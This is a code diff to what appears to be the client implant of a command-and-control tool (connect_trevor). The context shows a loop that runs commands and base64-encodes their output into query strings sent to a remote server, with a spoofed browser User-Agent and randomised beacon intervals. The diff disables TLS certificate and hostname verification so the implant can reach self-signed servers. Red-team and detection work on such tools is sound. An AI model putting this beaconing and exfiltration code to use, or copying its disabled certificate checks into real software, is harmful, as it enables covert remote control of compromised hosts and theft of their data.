@@ -40,6 +40,7 @@ import hashlib
 import http.cookiejar
 import platform
 import random
+import ssl
 import subprocess
 import sys
 import time
@@ -101,6 +102,10 @@ def random_interval(time_interval1, time_interval2):
 hostname = platform.node()
 cookie = http.cookiejar.CookieJar()
 
+# this line lets us ignore self-signed cert warnings,
+# because setting ssl context check_hostname and verify_mode doesn't seem to be good enough
+ssl._create_default_https_context = ssl._create_unverified_context
+
 
 def connect_trevor():
     # we need to register our asset first
@@ -113,7 +118,13 @@ def connect_trevor():
             # pipe out stdout and base64 encode it then request via a query string parameter
             req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={
                 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
+
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+
+            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie),
+                                                 urllib.request.HTTPSHandler(context=context))
             html = opener.open(req)
             break
 
@@ -123,7 +134,7 @@ def connect_trevor():
             if "Connection refused" in str(error):
                 pass
             else:
-                print("[!] Something went wrong, printing error: " + str(error))
+                print("[!] Something went wrong trying to connect, printing error: " + str(error))
 
 
 connect_trevor()
@@ -155,7 +166,13 @@ while 1:
                 # pipe out stdout and base64 encode it then request via a query string parameter
                 req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={
                     'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-                opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
+
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+
+                opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie),
+                                                     urllib.request.HTTPSHandler(context=context))
                 html = opener.open(req).read().decode('utf-8')
 
                 # sleep random interval and let cleanup on server side
